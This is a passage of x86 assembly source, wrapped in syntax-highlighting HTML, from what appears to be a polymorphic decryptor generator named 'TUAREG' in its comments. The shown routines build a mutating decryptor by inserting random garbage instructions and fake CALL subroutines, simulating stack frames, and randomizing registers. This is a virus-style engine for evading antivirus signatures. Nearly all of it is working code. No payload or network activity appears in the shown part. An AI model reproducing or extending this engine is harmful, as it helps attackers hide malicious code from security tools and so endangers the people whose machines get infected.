</span><span class="sc5">ArrayOfCalls3Ndx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ne they only can call a subroutine of</span><span class="sc0">
                                     </span><span class="sc1">; a higher level, to avoid inter-calls</span><span class="sc0">
                                     </span><span class="sc1">; that would make the decryptor to not</span><span class="sc0">
                                     </span><span class="sc1">; work (CALL_1 calls internally to CALL_2</span><span class="sc0">
                                     </span><span class="sc1">; and CALL_2 calls CALL_1, for example).</span><span class="sc0">
</span><span class="sc5">DoNormalCall</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; This flag puts at the beginning of the call the</span><span class="sc0">
                          </span><span class="sc1">; instructions PUSH EBP/MOV EBP,ESP, simulating the</span><span class="sc0">
                          </span><span class="sc1">; creation of a stack frame. In this version of the</span><span class="sc0">
                          </span><span class="sc1">; TUAREG isn't used, but externally seems a high</span><span class="sc0">
                          </span><span class="sc1">; level function.</span><span class="sc0">
</span><span class="sc5">CallsLevel1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; This variables are used to store the</span><span class="sc0">
</span><span class="sc5">CallsLevel1Ndx</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; address in the being-constructed de-</span><span class="sc0">
</span><span class="sc5">CallsLevel2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; cryptor where a CALL is. Later, when</span><span class="sc0">
</span><span class="sc5">CallsLevel2Ndx</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; the branch is finished, we determine</span><span class="sc0">
</span><span class="sc5">CallsLevel3</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; randomly if we use an already created</span><span class="sc0">
</span><span class="sc5">CallsLevel3Ndx</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; subroutine or we create a new one.</span><span class="sc0">

</span><span class="sc1">;; This function completes the CALLs pointed by the addresses in the arrays</span><span class="sc0">
</span><span class="sc1">;; above. Depending on the level of recursivity, we stored the address of that</span><span class="sc0">
</span><span class="sc1">;; CALL instruction in one of the levels. When we call to this function, de-</span><span class="sc0">
</span><span class="sc1">;; pending on the value in ECX, we complete them pointing to a created subrou-</span><span class="sc0">
</span><span class="sc1">;; tine (stored in ArrayOfCallsX) or we create a new subroutine and store the</span><span class="sc0">
</span><span class="sc1">;; address to that new one into ArrayOfCallsX.</span><span class="sc0">
</span><span class="sc1">;; ECX=0 for Calls level 1, ECX=84h for Calls level 2, ECX=84h*2 for level 3</span><span class="sc0">
</span><span class="sc5">CompleteCalls</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; Get the number of calls to complete</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">;Set the garbage</span><span class="sc0">
                                                 </span><span class="sc1">; recursivity (calls of level</span><span class="sc0">
                                                 </span><span class="sc1">; 3 can't do any CALL, to</span><span class="sc0">
                                                 </span><span class="sc1">; avoid too much recursivity)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@CompleteCalls</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; Have we completed all the calls?</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Completed</span><span class="sc0">    </span><span class="sc1">; If yes, we end</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Are there</span><span class="sc0">
                                                    </span><span class="sc1">; any created subroutine?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CreateCall</span><span class="sc0">  </span><span class="sc1">; If not, create a new one directly</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Get random flags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CreateCall</span><span class="sc0">  </span><span class="sc1">; Create a call with a 50% of probability</span><span class="sc0">
    </span><span class="sc5">@@AnotherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@AnotherRandom</span><span class="sc0">    </span><span class="sc1">; Get a random address from the list</span><span class="sc0">
                                         </span><span class="sc1">; of created subroutines</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; EBX=Displacement from the created subrou-</span><span class="sc0">
                                   </span><span class="sc1">; tine to the CALL instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Complete CALL</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Restore delta offset</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CompleteCalls</span><span class="sc0"> </span><span class="sc1">; Loop</span><span class="sc0">

       </span><span class="sc5">@@CreateCall</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; If there are</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AnotherRandom</span><span class="sc0">    </span><span class="sc1">; too much created subroutines, jump</span><span class="sc0">
                                         </span><span class="sc1">; to use any created one</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the address to the</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; CALL to complete</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateCALL</span><span class="sc0">                

                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CompleteCalls</span><span class="sc0"> </span><span class="sc1">; Loop</span><span class="sc0">
    </span><span class="sc5">@@Completed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">           </span><span class="sc1">; Return from function</span><span class="sc0">
</span><span class="sc5">CompleteCalls</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CreateCALL</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Fix delta offset (we can't put three</span><span class="sc0">
                                    </span><span class="sc1">; registers inside the brackets :P)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Now, set the address of</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; storage (EDI) into the array</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; of created subroutines</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; Restore delta offset</span><span class="sc0">
 </span><span class="sc5">@@AgainCalls</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NormalCall</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@NormalCall</span><span class="sc0">   </span><span class="sc1">; Simulate a stack frame with a 25% of</span><span class="sc0">
                                     </span><span class="sc1">; probability</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NormalCall</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DoNormalCall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">      </span><span class="sc1">; Insert PUSH EBP/MOV EBP,ESP</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EC8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NotNormalCall</span><span class="sc0">
   </span><span class="sc5">@@NormalCall</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DoNormalCall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">@@NotNormalCall</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; ESI=Address of storage</span><span class="sc0">
             </span><span class="sc1">;   cmp     byte ptr [ebp+GarbageRecursivity], 2</span><span class="sc0">
             </span><span class="sc1">;   jnz   @@SetNormalGarbage</span><span class="sc0">
             </span><span class="sc1">;   mov     byte ptr [ebp+SpecialGarbage], 1</span><span class="sc0">
             </span><span class="sc1">;   jmp   @@ContinueWithCALLContents</span><span class="sc0">
     </span><span class="sc5">@@SetNormalGarbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SpecialGarbage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">@@ContinueWithCALLContents</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make a lot of garbage inside the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; subroutine (included CALLs to other</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; subroutines, depending on the re-</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; cursivity level)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SpecialGarbage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Test if EDI has grown (void subrou-</span><span class="sc0">
                                         </span><span class="sc1">; tine)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NotNormalCall</span><span class="sc0"> </span><span class="sc1">;If it's void, repeat garbage generation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DoNormalCall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndCall</span><span class="sc0">    </span><span class="sc1">; If there is a stack frame simulation...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc0">    </span><span class="sc1">; ...store POP EBP</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">@@EndCall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0"> 
                </span><span class="sc6">stosb</span><span class="sc0">              </span><span class="sc1">; Store RET</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CreateCALL</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">PreCreateCALLs</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc5">@@MakeAnother</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontMake</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateCALL</span><span class="sc0">
   </span><span class="sc5">@@DontMake</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MakeAnother</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PreCreateCALLs</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">BifurcationNumber</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Number of recursivity for the function Branching</span><span class="sc0">
</span><span class="sc5">SpecialGarbage</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">JumpingArray</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Array of possible target addresses to</span><span class="sc0">
</span><span class="sc5">JumpingArrayNdx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; jump randomly to loop</span><span class="sc0">
</span><span class="sc5">JumpsToComplete</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Array where the looping jump addresses</span><span class="sc0">
</span><span class="sc5">JumpsToCompleteNdx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; are stored for later completion</span><span class="sc0">

</span><span class="sc5">TouchedRegisters</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Flags of "touched", for registers</span><span class="sc0">

</span><span class="sc1">;; This address selects any register which isn't ESP. If the selected register</span><span class="sc0">
</span><span class="sc1">;; hasn't the "touched" flag actived, the register is initialized with DoMOV</span><span class="sc0">
</span><span class="sc1">;; using a random value. Moreover, the function (as SelectARegister and</span><span class="sc0">
</span><span class="sc1">;; SelectARegisterWithInit) saves the last register returned, so the next call</span><span class="sc0">
</span><span class="sc1">;; to this functions won't return the same register as the time before.</span><span class="sc0">
</span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc5">@@Other</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegisterSelectedB4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Other</span><span class="sc0"> </span><span class="sc1">; Select a random between 0 and 7 with isn't</span><span class="sc0">
                              </span><span class="sc1">; ESP nor the last selected register</span><span class="sc0">
   </span><span class="sc5">SelectReg_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OK</span><span class="sc0">    </span><span class="sc1">; If the register is "touched", jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Other</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">   </span><span class="sc1">; Initialize the register with a random value</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Set the reg.</span><span class="sc0">
                                                               </span><span class="sc1">; as "touched"</span><span class="sc0">
       </span><span class="sc5">@@OK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegisterSelectedB4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Save it as the</span><span class="sc0">
                                                           </span><span class="sc1">; "selecter before"</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RegisterSelectedB4</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Place where we save the last selected</span><span class="sc0">
                                   </span><span class="sc1">; register</span><span class="sc0">

</span><span class="sc1">;; This function selects a register which is not Index1, Index2, Key or</span><span class="sc0">
</span><span class="sc1">;; Buffer (a register to use with garbage). If the register isn't "touched",</span><span class="sc0">
</span><span class="sc1">;; the register is initialized to a random value with a MOV or similar.</span><span class="sc0">
